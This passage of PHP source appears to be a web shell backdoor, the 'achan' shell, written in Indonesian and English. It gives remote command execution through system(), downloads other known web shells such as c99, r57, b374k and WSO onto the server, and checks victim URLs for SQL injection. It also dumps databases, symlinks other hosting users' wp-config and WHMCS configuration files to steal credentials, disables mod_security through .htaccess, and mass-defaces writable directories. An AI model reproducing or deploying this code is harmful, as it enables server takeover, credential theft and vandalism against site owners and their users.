	<textarea class='w3-codespan' style='width:100%;height:600px;' name='txta'>".htmlspecialchars(file_get_contents($_GET['i']."/".$_GET['s']))."</textarea>
	</form></div>";
}
if(isset($_POST['sbmt'])){
	$fp=fopen($_GET['i']."/".$_POST['namabaru'],'w');
	if(fwrite($fp,$_POST['txta'])){
		refpage("?i=".$_GET['i']);
	}else{
		refpage("?i=".$_GET['i']);
	}
	fclose($fp);
}elseif ($_GET['a']=='download') {
	ob_clean();
	$dunlut = $_GET['i']."/".$_GET['s'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($dunlut).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($dunlut));
	readfile($dunlut);
	exit;
}elseif ($_GET['a']=='chmod') {
	echo "<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow'>Change Permission</h3>
	<table><tr><td>
	new Permission :</td><td><input type='number' name='perms' value='".octdec(fileperms($_GET['i']."/".$_GET['s']))."' class='w3-input w3-animate-input' style='width:200px;'></td><td><input type='submit' value='>>' class='w3-btn w3-indigo'></td></tr></table></form></div>";
}
if(isset($_POST['perms'])){
	if(chmod($_GET['i']."/".$_GET['s'],$_POST['perms'])){
refpage("?i=".$_GET['i']);
	}else{
		refpage("?i=".$_GET['i']);
	}
}elseif ($_GET['a']=='tentang') {
	echo tentang();
}elseif ($_GET['a']=='shell') {

	echo "
<h3 class='w3-indigo w3-text-shadow w3-text-white w3-center'> Terminal Command Shell </h3>
	<form method='post'>
	<pre class='w3-code w3-indigo w3-text-shadow' style='height:700px;'>achan@".$_SERVER['HTTP_HOST'].":".getcwd()." $<input type='text' name='shell' class='w3-indigo w3-text-shadow' style='width:100%;height:24px;border:0;' value='".$_POST['shell']."'></form><br>";
	if(isset($_POST['shell'])){
		system($_POST['shell']);
	}
echo "</pre>";

}elseif ($_GET['a']=='cmd') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
	echo "
<h3 class='w3-indigo w3-text-shadow w3-text-white w3-center'> Command Prompt </h3>
	<form method='post'>
	<pre class='w3-code w3-indigo w3-text-shadow' style='height:700px;'>achan > ".getcwd()."  ><input type='text' name='cmd' class='w3-indigo w3-text-shadow' style='width:100%;height:24px;border:0;' value='".$_POST['cmd']."'></form><br>";
	if(isset($_POST['cmd'])){
		exe($_POST['shell']);
	}
	echo "</pre>";
}else{
	echo "<div class='w3-panel w3-indigo'><h3>This Just Work in Windows Server.</h3></div>";
}
}elseif ($_GET['a']=='phpinfo') {
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<div class=\"w3-table w3-striped w3-border w3-indigo w3-text-black w3-text-shadow\">".substr($buff,$awal,$akhir-$awal)."</div>";
}elseif ($_GET['a']=='wso') {
if(ambilcode($l['wso'],'achan-wso.php')){
			echo"Request done!  <a href='achan-wso.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='injection') {
if(ambilcode($l['injection'],'achan-1n73ction.php')){
			echo"Request done!  <a href='achan-1n73ction.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='bejak') {
if(ambilcode($l['bejak'],'achan-b374k.php')){
			echo"Request done!  <a href='achan-b374k.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='idx') {
	if(ambilcode($l['indoxploit_shell'],'achan-indoxploit.php')){
			echo"Request done!  <a href='achan-indoxploit.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='c') {
	if(ambilcode($l['c99'],'achan-c99.php')){
			echo"Request done!  <a href='achan-c99.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='r') {
	if(ambilcode($l['r57'],'achan-r57.php')){
			echo"Request done!  <a href='achan-r57.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='andela') {
	if(ambilcode($l['andela'],'achan-andela.php')){
			echo"Request done!  <a href='achan-andela.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='sbh') {
	if(ambilcode($l['sbh'],'achan-sbh.php')){
			echo"Request done!  <a href='achan-sbh.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='bh') {
	if(ambilcode($l['bh'],'achan-bh.php')){
			echo"Request done!  <a href='achan-bh.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='adminer') {
if(ambilcode($l['adminer'],'achan-adminer.php')){
			echo"Request done!  <a href='achan-adminer.php' target='_blank'>Click Here!</a>";
		}else{
			echo"Failed check  your connection!";
		}
}elseif ($_GET['a']=='svc') {
	echo'
	<div class="w3-center w3-container">
	<h3 class="w3-indigo w3-text-white w3-text-shadow w3-center">SQL injection vulnerable checker</h3>
	<form method="post" >
	<textarea style="width:60%;height:300px;" placeholder="http://korban.co.li/anu.php?id=1" name="korban" class="w3-indigo w3-codespan" style="width:500px;height:250px;border:0;"></textarea><br>
	<input type="submit" name="submit" value="Check!" class="w3-btn w3-indigo w3-hover-white">
</form>
<br>';
if(isset($_POST['submit'])){
$ko=$_POST['korban'];

$pisah=explode("\n",$ko);
echo "<hr>
<table class='w3-table w3-striped w3-border'><thead class='w3-black'><th>No.</th><th>Website</th><th>Status</th></thead>";
$no=1;
foreach ($pisah as $ah) {
	$dapatkan=file_get_contents($ah."'");
	if(preg_match('/SQL syntax;|You Have Error|Warning|mysql_fetch_array|mysql_fetch_assoc|mysql_num_rows/',$dapatkan)){
		echo "<tr class='w3-green w3-hover-white'><td>".$no++."</td><td><b>".$ah."</b></td><td>[<i>vulnerable</i>]</td></tr>";
	}else{
		echo "<tr class='w3-indigo w3-hover-white'><td>".$no++."</td><td><b>".$ah."</b></td><td>[<i>not vulnerable</i>]</td></tr>";
	}
}
}
echo "</table></div>";
}elseif ($_GET['a']=='dbdump') {
	echo '
	<div class="w3-center w3-container">
	<h3 class="w3-indigo w3-text-white w3-text-shadow w3-center">Database dumper</h3>
	<form method="post" >
<table class="w3-table w3-striped w3-border">
<tr>
	<td>Hostname </td>
	<td><input type="text" name="server" class="w3-input w3-animate-input" style="width:200px"></td></tr><tr>
	<td>Username</td>
	<td><input  type="text" name="username" class="w3-input w3-animate-input" style="width:200px"></td></tr><tr>
	<td>Password</td>
	<td><input  type="text" name="password" class="w3-input w3-animate-input" style="width:200px"></td></tr><tr>
	<td>DataBase</td>
	<td><input  type="text" name="dbname" class="w3-input w3-animate-input" style="width:200px"></td></tr>
	<tr>
	<td>DB Type </td>
	<td>
	<select  name="method" class="w3-input w3-animate-input" style="width:200px">
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input name="btnx" type="submit" value="Dump" class="w3-btn w3-indigo w3-hover-white"></td></tr>
	</form></center></table>

	</div>';
if (isset($_POST['btnx'])){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "achan-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="achan-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="achan-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 

}
}elseif ($_GET['a']=='mkdir') {
	echo "
	<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow'>Mass Make Directory</h3>
<form method='post'>
<textarea class='w3-indigo w3-code' style='border:0;width:700px;height:280px;' name='mkdir'>newdir\nnewdir2</textarea><br>
<input type='submit' class='w3-btn  w3-indigo w3-hover-white' value='make dir'>
</form>
</div>
	";
if(isset($_POST['mkdir'])){
	$dir=$_POST['mkdir'];
	$mdir=explode("\n",$dir);
	foreach ($mdir as $ndir) {
		mkdir($_GET['i']."/".$ndir,0777);
	}
	echo "<script>
	window.location.href='?i=".$_GET['i']."';
	</script>";
}
}elseif ($_GET['a']=='mkfile') {

		echo "
	<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow'>Make File</h3>
<form method='post'>
<table><tr><td>Save as:</td><td><input type='text' name='letakf' class='w3-input w3-animate-input' style='width:280px;' value='".$d."/achan-newfile.php'></td><td><input type='submit' class='w3-btn  w3-indigo w3-hover-white' value='make file' name='subfile'></td></tr></table>
<textarea class='w3-indigo w3-code' style='border:0;width:100%;height:500px;' name='mkfile'><?php\necho'sometext';\n?></textarea><br>
</form>
</div>";
if(isset($_POST['subfile'])){
	$xp=fopen($_POST['letakf'],"w");
	if(fwrite($xp,$_POST['mkfile'])){
		echo "<script>
		alert('file created!');
		</script>";
	}else{
		echo "<script>
		alert('failed to create file');
		</script>";
	}
	fclose($xp);
}
}elseif ($_GET['a']=='hi') {
	if(isset($_POST['gethash'])){
		$hash = $_POST['hash'];
		if(strlen($hash)==32){
			$hashresult = "MD5 Hash";
		}elseif(strlen($hash)==40){
			$hashresult = "SHA-1 Hash/ /MySQL5 Hash";
		}elseif(strlen($hash)==13){
			$hashresult = "DES(Unix) Hash";
		}elseif(strlen($hash)==16){
			$hashresult = "MySQL Hash / /DES(Oracle Hash)";
		}elseif(strlen($hash)==41){
			$GetHashChar = substr($hash, 40);
			if($GetHashChar == "*"){
				$hashresult = "MySQL5 Hash"; 
			}	
		}elseif(strlen($hash)==64){
			$hashresult = "SHA-256 Hash";
		}elseif(strlen($hash)==96){
			$hashresult = "SHA-384 Hash";
		}elseif(strlen($hash)==128){
			$hashresult = "SHA-512 Hash";
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$1$')){
				$hashresult = "MD5(Unix) Hash";
			} 	
		}elseif(strlen($hash)==37){
			if(strstr($hash, '$apr1$')){
				$hashresult = "MD5(APR) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$H$')){
				$hashresult = "MD5(phpBB3) Hash";
			} 	
		}elseif(strlen($hash)==34){
			if(strstr($hash, '$P$')){
				$hashresult = "MD5(Wordpress) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$5$')){
				$hashresult = "SHA-256(Unix) Hash";
			} 	
		}elseif(strlen($hash)==39){
			if(strstr($hash, '$6$')){
				$hashresult = "SHA-512(Unix) Hash";
			} 	
		}elseif(strlen($hash)==24){
			if(strstr($hash, '==')){
				$hashresult = "MD5(Base-64) Hash";
			} 	
		}else{
			$hashresult = "Hash type not found";
		}
	}else{
		$hashresult = "Not Hash Enteindigo";
	}
	
	echo'
	<div class="w3-container w3-center">
	<h3 class="w3-indigo w3-text-white w3-text-shadow"> Hash Identification </h3>
	
		<form method="POST">
		<table  class="w3-table w3-striped">
		<tr><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash"  class="w3-input w3-animate-input" style="width:200px"/></td><td><input type="submit" name="gethash" value="Identify Hash" class="w3-btn w3-indigo"/></td></tr>
		<tr><b><td>Result</td><td>:</td><td colspan=2>'.$hashresult.'</td></tr></b>
	</table></tr></form>
	</div>';
}elseif ($_GET['a']=='ph') {
		$submit= $_POST['enter'];
if (isset($submit)) {
$pass = $_POST['password']; 
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; 
$hash = md5($pass);
$md4 = hash("md4",$pass);
$hash_md5 = md5($salt.$pass); 
$hash_md5_double = md5(sha1($salt.$pass));
$hash1 = sha1($pass); 
$sha256 = hash("sha256",$text);
$hash1_sha1 = sha1($salt.$pass); 
$hash1_sha1_double = sha1(md5($salt.$pass)); 
}
echo '
<div class="w3-container w3-center">
<h3 class="w3-indigo w3-text-shadow w3-text-white">  Password Hash </h3>
<form  method="post">
<table class="w3-table w3-striped">
<tr><td>Input string :</td>
<td><input  type="text" name="password" class="w3-input w3-animate-input" style="width:280px" /></td><td>
<input  type="submit" name="enter" value="hash" class="w3-btn w3-indigo"/>
</td></tr>
<tr class="w3-indigo"><th colspan="3">Hasil Hash</th></center></tr>
<tr><td>Original Password</td><td colspan="2"><input  type="text" value="'.$pass.'" class="w3-input w3-animate-input" style="width:280px"></td></tr>
<tr><td>MD5</td><td colspan="2"><input  type="text"   class="w3-input w3-animate-input" style="width:280px" value="'.$hash.'"></td></tr>
<tr><td>MD4</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$md4.'"></td></tr>
<tr><td>MD5 with Salt</td><td colspan="2"><input type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$hash_md5.'"></td></tr>
<tr><td>MD5 with Salt & Sha1</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$hash_md5_double.'"></td></tr>
<tr><td>Sha1</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$hash1.'"></td></tr>
<tr><td>Sha256</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$sha256.'"></td></tr>
<tr><td>Sha1 with Salt</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$hash1_sha1.'"></td></tr>
<tr><td>Sha1 with Salt & MD5</td><td colspan="2"><input  type="text"  class="w3-input w3-animate-input" style="width:280px" value="'.$hash1_sha1_double.'"></td></tr></table></div>';
}elseif ($_GET['a']=='ed') {
	echo'<div class="w3-center w3-container">
	<h3 class="w3-indigo w3-text-shadow w3-text-white"> Enc0de & Dec0de + Conventer  </h3>
	<br>
<form method="post">
<textarea name="e" style="width:77%;height:300px"  placeholder="input string here [!]" class="w3-indigo">
</textarea><br><br>
<center>
	<select name="opt" style="width:70%" class="w3-input w3-center">
	 	<optgroup label="Converter">
	<option value="dechex">Decimal to Hexa</option> 	<option value="hexdec">Hexa to Decimal</option>
<option value="decoct">Decimal to Octa</option>
<option value="octdec">Octa to Decimal</option>	 
	 	<option value="decbin">Decimal to Binary</option>	
	 	<option value="bindec">Binary to Decimal</option>	
	 	 <option value="hexbin">Hexa to Binary</option>	
<option value="binhex">Binary to Hexa</option>
</optgroup><optgroup label="encode&decode">
	<option value="url">URL</option> 	<option value="base64">base64</option>
<option value="urlbase64">URL - base64</option>
<option value="cuu">Convert_uu</option>
<option value="sgzcuus64">str_rot13 - gzinflate - convert_uu - str_rot13 - base64 </option>
<option value="gz64">gzinflate - base64</option>	 
	 	<option value="sgz64">str_rot13 - gzinflate - base64</option>	
	 	<option value="s64">str_rot13 - gzinflate - str_rot13 - base64</option>	
<option value="sb64">str_rot13 - base64 </option>
	 	 <option value="64url">URL - base64</option>	
<option value="64u64u">URL - base64 - url - base64</option>
<option value="ss64"> base64 - str_rot13 - str_rot13</option>
</optgroup>
	</select>	
	<br> 
<input type="submit" value="Convert!" name="c" class="w3-btn w3-indigo w3-hover-white">
<input type="submit" value="enc0de" name="en" class="w3-btn w3-blue w3-hover-white">
<input type="submit" value="dec0de" name="de" class="w3-btn w3-yellow w3-hover-white">
</form>
	
	';
	 	$a = $_POST['e'];	
	 	$o = $_POST['opt'];
	if(isset($_POST['c'])){
	switch($o){
		case'dechex';
		$s= dechex($a);
		break;
		case'dechex';	
		$s= hexdec($a);
		break;
		case'decoct';
		$s= decoct($a);
		break;
		case'octdec';
		$s= octdec($a);
		break;
		case'decbin';
		$s= decbin($a);
		break;
		case'bindec';
		$s= bindec($a);
		break;
		case'hexbin';
		$s= hex2bin($a);
		break;
		case'binhex';
		$s= bin2hex($a);
		break;
		}
echo'<br>:: OutPut ::<br><textarea style="width:77%;height:300px " class="w3-indigo">'.$s.'</textarea>';
		}elseif(isset($_POST['en'])){
			switch($o){
				case'url';
				$r=urlencode($a);
				break;
				case'base64';
				$r=base64_encode($a);
				break;
				case'urlbase64';
				$r=urlencode(base64_encode($a));
				break;
				case'gz64';
				$r=base64_encode(gzdeflate($a));
			
			break;
			case'sgz64';
			$r=base64_encode(gzdeflate(str_rot13($a)));
			break;
			case's64';
			$r=(base64_encode(str_rot13(gzdeflate(str_rot13($a)))));
		break;
		case'sb64';
		$r=base64_encode(str_rot13($a));
		break;	
		case'64url';
		$r=base64_encode(urlencode($a));
		break;
		case'64u64u';
		$r=base64_encode(urlencode(base64_encode(urlencode($a))));
		break;
		case'cuu';
		$r=convert_uuencode($a);
		break;
	 case'sgzcuus64';
	 $r=base64_encode(str_rot13(convert_uuencode(gzdeflate(str_rot13($a)))));
	 break;
	 case'ss64';
	 $r=str_rot13(str_rot13(base64_encode($a)));
	 break;
		}
			echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" class="w3-indigo">'.$r.'</textarea>';
		
		}
//Dec0de
	if(isset($_POST['de'])){
		switch($o){
		 	case'url';
				$r=urldecode($a);
				break;
				case'base64';
				$r=base64_decode($a);
				break;
				case'urlbase64';
				$r=base64_decode(urldecode($a));
				break;
				case'gz64';
				$r=gzinflate(base64_decode($a));
			
			break;
			case'sgz64';
			$r=str_rot13(gzinflate(base64_decode($a)));
			break;
			case's64';
			$r=str_rot13(gzinflate(str_rot13(base64_decode($a))));
		break;
		case'sb64';
		$r=str_rot13(base64_decode($a));
		break;	
		case'64url';
		$r=urldecode(base64_decode($a));
		break;
		case'64u64u';
		$r=urldecode(base64_decode(urldecode(base64_decode($a))));
		break;
	 case'cuu';
		$r=convert_uudecode($a);
		break;
	 case'sgzcuus64';
	 $r=str_rot13(gzinflate(convert_uudecode(str_rot13(base64_decode($a)))));
	 break; 	
	 case'ss64';
	 $r=base64_decode(str_rot13(str_rot13($a)));
		}
		$rx = htmlspecialchars($r);
			echo'<br>:: OutPut::<br><textarea style="width:77%;height:300px" class="w3-indigo">'.$rx.'</textarea>';	
	}
}elseif ($_GET['a']=='rs') {
	echo"
	<div class='w3-container w3-center'>
	<h3 class='w3-indigo w3-text-shadow w3-text-white'> auto replace string </h3>
	<br>
	<form method='post'>
	<table class='w3-table w3-border'>
	<tr><td colspan=2><input type='submit' name='sstr' value='replace all' style='width:100%;' class='w3-btn w3-btn-block w3-indigo'></td></tr>
	<tr><td>
	<textarea name='str' style='width:600px;height:200px;' class='w3-indigo'>Your string here</textarea></td><td>
	<textarea name='str2' style='width:600px;height:200px;' class='w3-blue'>string will u replace</textarea></td></tr>
	<tr><td>
	<textarea name='str3' style='width:600px;height:200px;' class='w3-yellow'>string replace</textarea></td><td>
	<form>";
	if(isset($_POST['sstr'])){
		$rep=str_replace($_POST['str2'],$_POST['str3'],$_POST['str']);
		if($rep){
			echo'
			<textarea style="width:600px;height:200px;" class="w3-green">'.htmlspecialchars($rep).'</textarea>';
		}
	}
	echo "</td></tr></table>";
}elseif ($_GET['a']=='logout') {
	session_destroy();
	echo "<script>
	alert('Bye!');
	window.location.href='?login.php';
	</script>";
}elseif ($_GET['a']=='achan') {
	echo tentangAchan();
}elseif ($_GET['a']=='jkt48') {
	echo tentangJKT48();
}elseif ($_GET['a']=='cg') {
	if(!file("/etc/passwd")){ $etcpasswd="/etc/passwd  gak bisa di akses!";}else{ $etcpasswd= file_get_contents('/etc/passwd');}
	echo'<div class="w3-container w3-center"><h3 class="w3-indigo w3-text-white w3-text-shadow">Config Grabber</h3>';
    echo'<form method=post><center><textarea  name="user" class="w3-code w3-indigo" style="width:100%;height:500px">'.$etcpasswd.'</textarea><br><br><input type="submit" name="su" value="Gotcha e\'m all!" class="w3-btn w3-indigo"></form></center>';

if(isset($_POST['su']))
 {
 mkdir('config_grab',0777);
 $r = " \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('config_grab/.htaccess','w');
fwrite($f,$r);
echo "<br><center><b><i><a href='config_grab'>TOUCH ME SENPAI</a></i></b></center>";
$usr=explode("\n",$_POST['user']);
foreach($usr as $uss)
{
 $us=trim($uss);
$r="config_grab/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/blog/configuration.php',$r.$us.'..joomla');symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-congig.php',$r.$us.'..wordpress');symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
symlink('/home/'.$us.'/public_html/secure/configuration.php',$r.$us.'..securewhmcs');
symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-clients');
symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-client');
symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-billing');
symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-config');
}
echo'<center>berhasil!! <a href="config_grab" target="_blank">touch me senpai..</a></center>';
}
}elseif ($_GET['a']=='af') {
echo'<div class="w3-container w3-center"><h3 class="w3-indigo w3-text-shadow w3-text-white">Admin finder</h3>';
echo'<form method="POST" action="">site : <input type="text" name="url" style="width:260px" value="http://" class="w3-input w3-animate-input" style="width:300px;"><input type="submit" name="submit" value="find[!]"  class="w3-btn w3-indigo" /><br><br>';
function xss_protect($data, $strip_tags = false, $allowed_tags = "") { 
    if($strip_tags) {
  $data = strip_tags($data, $allowed_tags . "<b>");
    }

    if(stripos($data, "script") !== false) { 
  $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); 
    } else { 
  $result = htmlentities($data, ENT_QUOTES); 
    } 

    return $result;
}
function urlExist($url)
{
    $handle   = curl_init($url);
    if (false === $handle)
    {
    return false;
    }
    curl_setopt($handle, CURLOPT_HEADER, false);
    curl_setopt($handle, CURLOPT_FAILONERROR, true);
    curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); // request as if Firefox
    curl_setopt($handle, CURLOPT_NOBODY, true);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
    $connectable = curl_exec($handle);
    curl_close($handle);
    return $connectable;
}
    if(isset($_POST['submit']) && isset($_POST['url']))
    {
  $url= htmlentities(xss_protect($_POST['url']));
  if(filter_var($url, FILTER_VALIDATE_URL))
  {
    $trying = array(':2082',':2083','a_admins/','admin/','adminweb/','po-admin','index.php?q=admin','administrator/','admin/admin.php','cpanel','admin3/','admin4/','admin5/','usuarios/',
    'usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/',
    'panel-administracion/','instadmin/','memberadmin/','administratorlogin/','adm/','admin/account.php',
    'admin/index.php','admin/login.php','admin/admin.php','admin/account.php','admin_area/admin.php',
    'admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html',
    'admin/index.html','admin/login.html','admin/admin.html','admin_area/index.php','bb-admin/index.php','bb-admin/login.php',
    'bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html','admin/controlpanel.php','admin.php',
    'admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html',
    'panel-administracion/login.html','admin/cp.php','cp.php','administrator/index.php','administrator/login.php',
    'nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php','administrator/account.php',
    'administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
    'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html',
    'login.php','modelsearch/login.php','moderator.php','moderator/login.php','moderator/admin.php','account.php',
    'pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php',
    'adminarea/index.html','adminarea/admin.html','webadmin.php','webadmin/index.php','webadmin/admin.php',
    'admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html',
    'login.html','modelsearch/login.html','moderator/login.html','adminarea/login.html','panel-administracion/index.html',
    'panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admincontrol/login.html',
    'adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php',
    'adminarea/index.php','adminarea/admin.php','adminarea/login.php','panel-administracion/index.php',
    'panel-administracion/admin.php','modelsearch/index.php','modelsearch/admin.php','admincontrol/login.php',
    'adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
    'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin.asp','admin/admin.asp',
    'admin_area/admin.asp','admin_area/login.asp','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp',
    'bb-admin/admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','user.asp','webadmin/index.asp',
    'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp',
    'adminLogin.asp','admin/adminLogin.asp','home.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp',
    'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp',
    'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
    'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp');
 echo "<table class='w3-table w3-border'><thead class='w3-indigo'><th>Website</th><th>Status</th></thead>";
    foreach($trying as $sec)
    {
    $urll=$url.'/'.$sec;
   
    if(urlExist($urll))
    {
    echo '<tr class="w3-green"><td><a href="'.$urll.'">'.$urll.'</a></td><td><i><b><u>FOUND</u></b></i></td></tr>';
    exit;
    }
    else
    {
    echo '<tr class="w3-grey"><td>'.$urll.'</td><td>NOT FOUND</td></tr>';
    }   
    }
    echo '<tr class="w3-orange w3-center"><td colspan=2>Could not find admin page.[!]</td></tr>';
  }
  else
  {
    echo '<tr class="w3-indigo w3-centere"><td colspan=2>invalid url Enteindigo</td></tr>';    
  }
  echo "</table>";
    }
}elseif ($_GET['a']=='md') {
	echo'<div class="w3-container w3-center">
	<h3 class="w3-center w3-indigo w3-text-shadow w3-text-white">   Mass deface </h3>
	<small> by indoXploit </small>';
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=indigo>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=indigo>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
